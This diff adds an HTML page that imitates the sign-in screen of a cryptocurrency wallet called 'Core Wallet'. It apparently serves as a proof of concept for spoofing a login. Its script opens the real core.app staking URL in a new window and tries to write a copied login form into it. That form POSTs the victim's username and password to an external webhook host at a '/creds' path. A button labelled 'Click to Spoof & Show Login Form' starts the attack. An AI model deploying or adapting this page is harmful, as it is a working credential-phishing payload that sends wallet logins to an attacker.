@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Core Wallet - Stake</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: #0a0a0a;
+      color: #e0e0e0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .card {
+      background: #111;
+      padding: 40px;
+      border-radius: 16px;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 24px;
+      color: #00ff88;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin: 12px 0;
+      border: 1px solid #333;
+      border-radius: 8px;
+      background: #1a1a1a;
+      color: #fff;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #00ff88;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    button:hover {
+      background: #00e676;
+      transform: translateY(-2px);
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h1>Core Wallet</h1>
+    <p style="color:#aaa; margin-bottom:32px;">Sign in to stake and manage your assets</p>
+
+    <form id="loginForm">
+      <input type="text" name="username" placeholder="Username or Email" required autocomplete="username">
+      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+      <button type="submit">Sign In</button>
+    </form>
+  </div>
+
+  <script>
+    const OOB = "https://keen-unicorn-32.webhook.cool";
+
+    function spoof() {
+      let win = window.open("https://core.app/stake", "_blank");
+
+      setTimeout(() => {
+        try {
+          win.document.write(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Core Wallet - Sign In</title>
+  <style>
+    body { margin:0; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; background:#0a0a0a; color:#e0e0e0; height:100vh; display:flex; justify-content:center; align-items:center; }
+    .card { background:#111; padding:40px; border-radius:16px; box-shadow:0 10px 40px rgba(0,0,0,0.8); width:100%; max-width:420px; text-align:center; }
+    h1 { font-size:28px; margin-bottom:24px; color:#00ff88; }
+    input { width:100%; padding:14px; margin:12px 0; border:1px solid #333; border-radius:8px; background:#1a1a1a; color:#fff; font-size:16px; box-sizing:border-box; }
+    button { width:100%; padding:14px; background:#00ff88; color:#000; border:none; border-radius:8px; font-size:18px; font-weight:bold; cursor:pointer; }
+    button:hover { background:#00e676; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Core Wallet</h1>
+    <p style="color:#aaa; margin-bottom:32px;">Sign in to stake and manage your assets</p>
+    <form action="${OOB}/creds" method="POST">
+      <input type="text" name="username" placeholder="Username or Email" required autocomplete="username">
+      <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
+      <button type="submit">Sign In</button>
+    </form>
+  </div>
+</body>
+</html>
+          `);
+          win.document.close();
+        } catch (e) {
+          console.warn("Browser blocked injection:", e);
+        }
+      }, 50);
+    }
+  </script>
+
+  <button onclick="spoof()" style="position:fixed; top:20px; left:20px; padding:15px 30px; font-size:20px; background:#4285f4; color:white; border:none; border-radius:8px; cursor:pointer;">
+    Click to Spoof & Show Login Form
+  </button>
+
+</body>
+</html>
